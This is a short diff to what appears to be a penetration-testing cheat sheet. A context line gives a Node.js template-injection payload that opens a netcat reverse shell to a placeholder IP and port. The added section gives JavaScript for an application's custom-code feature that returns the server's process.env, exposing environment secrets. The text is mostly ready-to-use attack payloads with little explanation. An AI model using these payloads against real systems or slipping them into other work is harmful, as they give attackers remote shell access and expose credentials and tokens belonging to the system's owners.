@@ -19,3 +19,15 @@ Maybe have CVE-2023-46298 if save cache
 ### RCE node js teamplate
 
 If you discover a node.js template area, you should try triggerable node payload `require('child_process').exec('nc -e sh ip port');{src:/bin/sh/}`
+
+### JS Custome Execute
+
+Added JavaScript code in the custom code feature:&#x20;
+
+```
+export default async function run({ execution_id, input, data }) {
+    return {
+        env: process.env,
+    };
+}
+```
